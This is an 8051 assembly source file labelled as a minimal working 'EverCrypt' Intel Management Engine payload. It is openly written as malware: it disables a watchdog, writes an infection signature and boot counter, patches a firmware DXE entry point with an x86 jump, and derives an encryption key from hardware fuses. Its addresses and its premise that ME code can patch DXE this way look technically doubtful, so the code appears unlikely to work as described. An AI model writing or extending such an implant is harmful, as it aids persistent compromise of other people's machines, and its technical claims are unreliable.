;;; ===========================================================================
;;; EverCrypt Intel ME Payload - Minimal Working Version
;;; Assembler: sdas8051 (SDCC)
;;; ===========================================================================

        .module evercrypt_me
        
;;; ===========================================================================
;;; Code Area
;;; ===========================================================================

        .area   CSEG    (CODE)
        .area   GSINIT  (CODE)
        .area   GSFINAL (CODE)

;;; ===========================================================================
;;; Constants
;;; ===========================================================================

WDT_CTRL        =       0x0800
HECI_CSR        =       0x2000
ME_SIG_ADDR     =       0xFFF0
ME_BOOT_CNT     =       0xFFF8
DXE_ENTRY       =       0x0000
HAP_BIT         =       0x1300

;;; ===========================================================================
;;; Reset Vector (execution starts here)
;;; ===========================================================================

        .area   CSEG    (CODE)

        ;; Reset vector at 0x0000
        ljmp    start

        ;; Skip interrupt vectors (0x03-0x2F)
        .ds     0x2D

;;; ===========================================================================
;;; Main Entry Point
;;; ===========================================================================

start:
        ;; Disable watchdog timer
        mov     dptr, #WDT_CTRL
        clr     a
        movx    @dptr, a

        ;; Write infection marker
        acall   mark_infection

        ;; Install DXE hooks
        acall   install_hooks

        ;; Derive encryption key
        acall   derive_key

        ;; Enter infinite loop
        sjmp    .

;;; ===========================================================================
;;; MARK_INFECTION - Write signature
;;; ===========================================================================

mark_infection:
        mov     dptr, #ME_SIG_ADDR
        
        mov     a, #0x45        ; 'E'
        movx    @dptr, a
        inc     dptr
        
        mov     a, #0x43        ; 'C'
        movx    @dptr, a
        inc     dptr
        
        mov     a, #0x52        ; 'R'
        movx    @dptr, a
        inc     dptr
        
        mov     a, #0x59        ; 'Y'
        movx    @dptr, a
        inc     dptr
        
        mov     a, #0x50        ; 'P'
        movx    @dptr, a
        inc     dptr
        
        mov     a, #0x54        ; 'T'
        movx    @dptr, a

        ;; Increment boot counter
        mov     dptr, #ME_BOOT_CNT
        movx    a, @dptr
        inc     a
        movx    @dptr, a

        ret

;;; ===========================================================================
;;; INSTALL_HOOKS - Patch DXE entry point
;;; ===========================================================================

install_hooks:
        ;; Enable HECI
        mov     dptr, #HECI_CSR
        mov     a, #0x01
        movx    @dptr, a

        ;; Write x86 jump instruction
        mov     dptr, #DXE_ENTRY
        mov     a, #0xEA        ; LJMP opcode
        movx    @dptr, a
        
        inc     dptr
        mov     a, #0x00
        movx    @dptr, a
        
        inc     dptr
        mov     a, #0x10
        movx    @dptr, a
        
        inc     dptr
        clr     a
        movx    @dptr, a
        
        inc     dptr
        movx    @dptr, a

        ret

;;; ===========================================================================
;;; DERIVE_KEY - Read hardware fuses
;;; ===========================================================================

derive_key:
        mov     dptr, #0x1000   ; Fuse base address
        mov     r0, #0x30       ; Internal RAM storage
        mov     r7, #32         ; 32 bytes

derive_loop:
        movx    a, @dptr
        mov     @r0, a
        inc     dptr
        inc     r0
        djnz    r7, derive_loop

        ;; Simple mixing
        mov     r0, #0x30
        mov     r7, #32

mix_loop:
        mov     a, @r0
        xrl     a, #0xA5
        rl      a
        mov     @r0, a
        inc     r0
        djnz    r7, mix_loop

        ret